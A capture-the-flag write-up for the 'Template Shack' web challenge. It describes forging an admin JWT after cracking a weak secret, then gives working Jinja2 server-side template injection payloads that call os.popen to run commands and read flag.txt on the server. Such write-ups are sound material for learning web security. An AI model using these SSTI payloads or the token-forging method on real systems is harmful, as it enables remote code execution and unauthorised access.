# Template Shack

## Problem

```
Check out the coolest web templates online!

Connect here:
http://jh2i.com:50023
```

## Solution

***Note**: solved after competition end*

The link takes us to a [page](images/templateshack1.png) 'selling' styling templates. There is a [login functionality](images/templateshacklogin.PNG), but no way of registering. 
Looking at the page's source reveals an interesting TODO comment.

![](images/templateshack1a.png)

So there is likely some sort of admin section, perhaps in a hidden endpoint like `/admin`. However trying to accessing it
returns a 401 Unauthorized error code. [Checking inspector tool](images/templateshack2.PNG) in the `/login` endpoint, we 
find a JWT cookie named `token`.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
```
We can use [this site]() to decode the JWT token and get the information within the token.

The next step involves cracking the secret contained within the token. This would allow us to forge our own custom token.
Using John the Ripper:

we obtain the secret value `supersecret`. We can then forge a custom JWT token with `username` attribute set to `admin`.
This would allow us to access the `/admin` endpoint, through a new button `Admin` at the top right.

![](images/templateshack3.png)

&nbsp;

#### Accessing Admin Section

![](images/templateshack4.png)

By messing around with the admin panel, we can find that there is a custom 404 page (as seen when clicking on *Charts* or 
*Tables*). In Flask web applications using Jinja2's templating language, this can often lead to a Server-Side Template Injection 
(SSTI).

![](images/templateshack5.png)

You can test for this by passing an expression between two sets of brackets (because that is how Jinja2 works). 
For instance, by trying to reach the page `{{ 2+2 }}`, the 404 page should display `/admin/4` (the expression would be evaluated).

![](images/templateshack6.png)

After a bit of tinkering, I found you can use the `popen` command in `os` Python library to achieve RCE, by inputting the
payload below:
```
/admin/{{config.__class__.__init__.__globals__['os'].popen('<command>').read()}}
```

We use the below command to list all files:
```
/admin/{{config.__class__.__init__.__globals__['os'].popen('ls -l').read()}}
```

![](images/templateshack7.png)

There is a file `flag.txt`. We print the contents of `flag.txt`:
```
/admin/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
```

![](images/templateshack_flag.png)

**Flag**: `flag{easy_jinja_SSTI_RCE}`

&nbsp;

#### References:
* [Jinja2 SSTI](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)